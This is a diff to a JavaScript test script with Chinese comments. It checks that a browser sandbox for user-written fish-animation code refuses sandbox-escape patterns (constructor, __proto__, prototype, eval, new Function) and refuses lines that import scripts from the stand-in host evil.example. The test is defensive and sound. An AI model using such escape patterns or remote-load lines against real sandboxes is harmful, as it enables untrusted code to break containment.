@@ -43,9 +43,13 @@ function extractFunction(src, name) {
 // FISH_ANIM_SHADOWED 是 const 数组，不是函数，单独从源码里取出来。
 const shadowedSrc = (source.match(/const FISH_ANIM_SHADOWED = \[[^\]]*\];/) || [""])[0];
 if (!shadowedSrc) throw new Error("index.html 里找不到 FISH_ANIM_SHADOWED");
+// 黑名单同样是模块级常量，沙箱里跑这段函数必须把它一起注入，否则 ReferenceError。
+const forbiddenSrc = (source.match(/const FISH_ANIM_FORBIDDEN = \[[\s\S]*?\n  \];/) || [""])[0];
+if (!forbiddenSrc) throw new Error("index.html 里找不到 FISH_ANIM_FORBIDDEN");
 
 const { compileFishAnimation, makeFishApi, runFishAnimation } = new Function(`
 ${shadowedSrc}
+${forbiddenSrc}
 ${extractFunction(source, "compileFishAnimation")}
 ${extractFunction(source, "makeFishApi")}
 ${extractFunction(source, "runFishAnimation")}
@@ -57,6 +61,21 @@ chk("纯空白 → null", compileFishAnimation("   \n  "), null);
 chk("undefined → null", compileFishAnimation(undefined), null);
 chk("合法代码 → 函数", typeof compileFishAnimation("fish.speed = 3;"), "function");
 chk("语法错误 → null", compileFishAnimation("this is not js {{{"), null);
+
+console.log("\n--- 编译前黑名单：能绕回全局的写法一律不编译 ---");
+[
+  ["(() => {}).constructor（拿新构造器）", "fish.x = (() => {}).constructor ? 1 : 2;"],
+  ["__proto__", "fish.x = fish.__proto__ ? 1 : 2;"],
+  ["prototype", "fish.x = Object.prototype ? 1 : 2;"],
+  ["eval", "fish.x = eval('1');"],
+  ["动态 import", "import('https://evil.example/x.js');"],
+  ["importScripts", "importScripts('https://evil.example/x.js');"],
+  ["new Function", "fish.x = new Function('return 1')();"]
+].forEach(([name, src]) => {
+  chk(`拒绝含 ${name} 的代码`, compileFishAnimation(src), null);
+});
+chk("注释里提到被禁的词不算（先剥注释再扫）",
+  typeof compileFishAnimation("// constructor 只是注释里的说明\nfish.speed = 3;"), "function");
 
 console.log("\n--- 全局名被遮蔽（代码里拿不到 window/document/fetch/localStorage/globalThis）---");
 const globals = ["window", "document", "fetch", "localStorage", "globalThis", "XMLHttpRequest", "navigator", "Function"];
